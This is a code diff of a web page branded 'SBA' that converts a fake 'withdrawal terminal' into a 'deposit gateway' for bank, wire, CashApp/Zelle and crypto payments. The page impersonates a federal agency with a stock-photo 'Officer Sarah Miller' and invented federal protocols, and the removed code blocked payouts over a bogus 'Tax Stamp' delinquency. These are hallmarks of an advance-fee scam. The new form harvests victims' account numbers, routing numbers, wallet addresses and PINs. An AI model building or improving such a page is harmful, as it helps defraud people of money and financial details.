@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA | Withdrawal Terminal</title>
+    <title>SBA | Deposit Terminal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -53,8 +53,8 @@
     <header class="header-container">
         <div class="sba-logo-sm" onclick="location.href='dashboard.html'"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
         <div class="ml-3">
-            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Disbursement</h1>
-            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter mt-1">ACH/WIRE Node 7-B</p>
+            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Deposit Gateway</h1>
+            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter mt-1">ACH/WIRE/CRYPTO Node 7-B</p>
         </div>
         <div class="ml-auto text-right">
             <p class="text-[8px] font-black text-slate-400 uppercase">Avail. Funds</p>
@@ -69,7 +69,7 @@
                 <div class="flex gap-3 text-rose-800">
                     <i class="fas fa-shield-slash mt-1"></i>
                     <div>
-                        <p class="text-[9px] font-black uppercase">Gateway Error: Funds Reverted</p>
+                        <p class="text-[9px] font-black uppercase">Gateway Error</p>
                         <p id="decline-text" class="text-[10px] font-bold mt-1">...</p>
                     </div>
                 </div>
@@ -80,14 +80,14 @@
                     <i class="fas fa-lock text-slate-400"></i>
                 </div>
                 <h2 class="text-xs font-black uppercase text-slate-700 mb-2">Security Initialization</h2>
-                <p class="text-[9px] font-bold text-slate-400 uppercase mb-6">Create a 4-digit transfer key</p>
+                <p class="text-[9px] font-bold text-slate-400 uppercase mb-6">Create a 4-digit security key</p>
                 <input type="tel" id="regPin" maxlength="4" class="s-input text-center text-xl tracking-[12px]" placeholder="****">
                 <button onclick="savePin()" class="btn-fed">Register Security Node</button>
             </div>
 
             <div id="formView" class="hidden">
                 <h2 class="text-[9px] font-black uppercase text-slate-400 tracking-widest mb-4 flex items-center gap-2">
-                    <i class="fas fa-satellite-dish text-red-600"></i> Transmission Channel
+                    <i class="fas fa-satellite-dish text-red-600"></i> Deposit Channel
                 </h2>
 
                 <div class="method-grid">
@@ -99,48 +99,47 @@
 
                 <div id="fields">
                     <div id="f_bank">
-                        <label class="label-text">Account Holder</label><input type="text" id="b_name" class="s-input" placeholder="Full Legal Name">
+                        <label class="label-text">Sender Account Holder</label><input type="text" id="b_name" class="s-input" placeholder="Full Legal Name">
                         <div class="grid grid-cols-2 gap-3">
                             <div><label class="label-text">Account No.</label><input type="tel" id="b_acc" class="s-input"></div>
                             <div><label class="label-text">Routing No.</label><input type="tel" id="b_rout" class="s-input"></div>
                         </div>
                     </div>
                     <div id="f_wire" class="hidden">
-                        <label class="label-text">Beneficiary Bank</label><input type="text" id="w_bank_name" class="s-input" placeholder="Global Bank Name">
-                        <label class="label-text">SWIFT / BIC Code</label><input type="text" id="w_swift" class="s-input" placeholder="Optional for domestic">
-                        <label class="label-text">Account Number (IBAN)</label><input type="text" id="w_iban" class="s-input">
+                        <label class="label-text">Sending Bank Name</label><input type="text" id="w_bank_name" class="s-input">
+                        <label class="label-text">SWIFT / IBAN</label><input type="text" id="w_iban" class="s-input">
                     </div>
                     <div id="f_cash" class="hidden">
-                        <label class="label-text">Platform (CashApp/Zelle/Paypal)</label>
-                        <select id="c_platform" class="s-input"><option value="CashApp">CashApp</option><option value="Zelle">Zelle</option><option value="PayPal">PayPal</option></select>
-                        <label class="label-text">Recipient ID</label><input type="text" id="c_tag" class="s-input" placeholder="@handle">
+                        <label class="label-text">Platform</label>
+                        <select id="c_platform" class="s-input"><option value="CashApp">CashApp</option><option value="Zelle">Zelle</option></select>
+                        <label class="label-text">Sender Identifier / ID</label><input type="text" id="c_tag" class="s-input">
                     </div>
                     <div id="f_crypto" class="hidden">
-                        <label class="label-text">Network Type</label>
-                        <select id="cr_net" class="s-input"><option value="BTC">Bitcoin (BTC)</option><option value="USDT_ERC20">USDT (ERC20)</option><option value="USDT_TRC20">USDT (TRC20)</option></select>
-                        <label class="label-text">Destination Address</label><input type="text" id="cr_addr" class="s-input" placeholder="0x... or Wallet String">
+                        <label class="label-text">Network</label>
+                        <select id="cr_net" class="s-input"><option value="BTC">BTC</option><option value="USDT">USDT</option></select>
+                        <label class="label-text">Sender Wallet Address</label><input type="text" id="cr_addr" class="s-input">
                     </div>
                 </div>
 
                 <div class="grid grid-cols-2 gap-4 mt-2">
                     <div><label class="label-text">Amount ($)</label><input type="number" id="w_amt" class="s-input" placeholder="0.00"></div>
-                    <div><label class="label-text">Transfer Pin</label><input type="tel" id="w_pin" maxlength="4" class="s-input text-center tracking-[8px]" placeholder="****"></div>
+                    <div><label class="label-text">Security Pin</label><input type="tel" id="w_pin" maxlength="4" class="s-input text-center tracking-[8px]" placeholder="****"></div>
                 </div>
-                <button id="sendBtn" onclick="sendW()" class="btn-fed">Authorize Disbursement</button>
+                <button id="sendBtn" onclick="sendD()" class="btn-fed">Authorize Deposit</button>
             </div>
 
             <div id="pendingView" class="hidden text-center py-5">
                 <div class="w-14 h-14 border-4 border-[#002e6d] border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
-                <h3 class="font-black text-xs uppercase italic">Clearing Internal Audit</h3>
+                <h3 class="font-black text-xs uppercase italic">Processing Deposit</h3>
                 <p class="text-[9px] text-slate-400 font-bold mt-4 px-8 uppercase leading-relaxed tracking-wide">
-                    Agent Sarah Miller is verifying the transmission hash with federal reserve protocol 701.
+                    System is verifying the transaction hash with the node network.
                 </p>
                 
                 <div class="support-agent-box" onclick="location.href='support.html'">
                     <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="agent-img" alt="Officer Sarah">
                     <div class="text-left">
                         <p class="text-[10px] font-black text-slate-800 uppercase leading-none mb-1">Officer Sarah Miller</p>
-                        <p class="text-[8px] font-bold text-emerald-600 uppercase">Verifying Transmission...</p>
+                        <p class="text-[8px] font-bold text-emerald-600 uppercase">Verifying Deposit...</p>
                     </div>
                     <i class="fas fa-comment-dots ml-auto text-slate-300"></i>
                 </div>
@@ -155,10 +154,10 @@
                 <div class="w-16 h-16 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-5">
                     <i class="fas fa-check-circle text-2xl"></i>
                 </div>
-                <h3 class="font-black text-base uppercase text-slate-800">Funds Transmitted</h3>
-                <p class="text-[9px] text-slate-500 font-bold mt-3 px-6 uppercase leading-relaxed">The transfer has been successfully queued for the next ACH/Wire batch window.</p>
+                <h3 class="font-black text-base uppercase text-slate-800">Deposit Logged</h3>
+                <p class="text-[9px] text-slate-500 font-bold mt-3 px-6 uppercase leading-relaxed">The deposit has been submitted and is pending final batch-cycle validation.</p>
                 <div class="mt-8 space-y-3">
-                    <button onclick="reopenForm()" class="btn-success">New Transfer</button>
+                    <button onclick="reopenForm()" class="btn-success">New Deposit</button>
                     <a href="dashboard.html" class="block text-[9px] font-black text-slate-400 uppercase underline">Terminal Exit</a>
                 </div>
             </div>
@@ -174,7 +173,7 @@
         import { doc, onSnapshot, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
         import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
-        let bal = 0, pin = "", method = "BANK", isTaxCompliant = false;
+        let bal = 0, pin = "", method = "BANK";
 
         onAuthStateChanged(auth, (user) => {
             if (!user) { window.location.href = "login.html"; return; }
@@ -186,9 +185,6 @@
                 
                 bal = d.balance || 0; 
                 pin = d.securityPin || ""; 
-                const currentAmt = d.withdrawAmount || 0;
-                const taxStatus = d.taxStatus || "IDLE";
-                isTaxCompliant = ["SUCCESSFUL", "VERIFIED", "APPROVED"].includes(taxStatus);
 
                 document.getElementById('bal').innerText = Number(bal).toLocaleString();
 
@@ -196,21 +192,13 @@
                 views.forEach(v => document.getElementById(v).classList.add('hidden'));
                 document.getElementById('reason-box').classList.add('hidden');
 
-                const status = d.withdrawStatus || "IDLE";
+                const status = d.depositStatus || "IDLE";
 
                 if(['DECLINED', 'REJECTED', 'FAILED'].includes(status)) {
-                    if(currentAmt > 0) {
-                        await updateDoc(doc(db, "users", user.uid), {
-                            balance: increment(currentAmt),
-                            withdrawAmount: 0,
-                            withdrawStatus: "IDLE_REJECTED"
-                        });
-                        return;
-                    }
                     document.getElementById('formView').classList.remove('hidden');
-                    if(d.withdrawNote) {
+                    if(d.depositNote) {
                         document.getElementById('reason-box').classList.remove('hidden');
-                        document.getElementById('decline-text').innerText = d.withdrawNote;
+                        document.getElementById('decline-text').innerText = d.depositNote;
                     }
                 } 
                 else if(!pin) document.getElementById('setupView').classList.remove('hidden');
@@ -235,24 +223,17 @@
         };
 
         window.reopenForm = async () => {
-            await updateDoc(doc(db, "users", auth.currentUser.uid), { withdrawStatus: "IDLE", withdrawAmount: 0 });
+            await updateDoc(doc(db, "users", auth.currentUser.uid), { depositStatus: "IDLE", depositAmount: 0 });
         };
 
-        window.sendW = async () => {
+        window.sendD = async () => {
             const amt = Number(document.getElementById('w_amt').value);
             const wPin = document.getElementById('w_pin').value;
 
-            if(!isTaxCompliant) {
-                alert("FEDERAL BLOCK: Account is flagged for 'Tax Stamp' delinquency.");
-                window.location.href = "tax.html";
-                return;
-            }
-
-            if(!amt || amt < 5) return alert("Minimum withdrawal is $5");
-            if(amt > bal) return alert("Insufficient Allocation Balance");
+            if(!amt || amt < 5) return alert("Minimum deposit is $5");
             if(wPin !== pin) return alert("Security Pin Incorrect");
 
-            document.getElementById('sendBtn').innerText = "TRANSMITTING...";
+            document.getElementById('sendBtn').innerText = "PROCESSING...";
             document.getElementById('sendBtn').disabled = true;
 
             let details = "";
@@ -263,16 +244,15 @@
 
             try {
                 await updateDoc(doc(db, "users", auth.currentUser.uid), {
-                    balance: increment(-amt),
-                    withdrawAmount: amt,
-                    withdrawStatus: "PENDING",
-                    withdrawMethod: method,
-                    withdrawDetails: details,
-                    withdrawDate: new Date().toLocaleString()
+                    depositAmount: amt,
+                    depositStatus: "PENDING",
+                    depositMethod: method,
+                    depositDetails: details,
+                    depositDate: new Date().toLocaleString()
                 });
             } catch (e) {
                 alert("Gateway timeout.");
-                document.getElementById('sendBtn').innerText = "Authorize Disbursement";
+                document.getElementById('sendBtn').innerText = "Authorize Deposit";
                 document.getElementById('sendBtn').disabled = false;
             }
         };
